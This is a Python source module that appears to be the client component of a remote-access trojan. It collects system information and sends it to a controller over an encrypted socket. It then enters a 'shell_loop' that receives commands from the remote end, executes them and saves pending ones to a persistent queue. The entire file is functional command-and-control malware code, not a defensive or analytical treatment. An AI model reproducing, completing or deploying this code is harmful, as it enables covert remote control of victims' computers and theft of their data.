import json
from .encryption import encrypt_data, decrypt_data
from .features.system_info import get_initial_info
from .features.command_queue import load_command_queue, process_queued_commands, command_queue, save_command_queue
from .features import execute_command

def initialize_connection(sock):
    initial_client_data = get_initial_info()
    send_data(sock, {"type": "initial_info", "data": initial_client_data})

def send_data(sock, data_dict):
    try:
        encrypted_data = encrypt_data(data_dict)
        if encrypted_data:
            sock.send(encrypted_data)
    except Exception as e:
        print(f"[-] Error sending data: {e}")

def recv_data(sock):
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                return None
            decrypted_data = decrypt_data(chunk)
            if decrypted_data:
                try:
                    return json.loads(decrypted_data)
                except json.JSONDecodeError:
                    continue
            return None
    except Exception as e:
        print(f"[-] Recv_data error: {e}")
        return None

def shell_loop(sock):
    load_command_queue()
    process_queued_commands()
    while True:
        try:
            command_data = recv_data(sock)
            if command_data is None:
                print("[-] Connection lost or invalid data received. Queuing commands.")
                if isinstance(command_data, dict):
                    command_queue.append(command_data)
                    save_command_queue()
                break
            if not isinstance(command_data, dict) or 'cmd' not in command_data:
                continue
            if execute_command(command_data, sock):
                return True
        except Exception as e:
            print(f"[!] Error in client shell_loop: {e}")
            break
    return False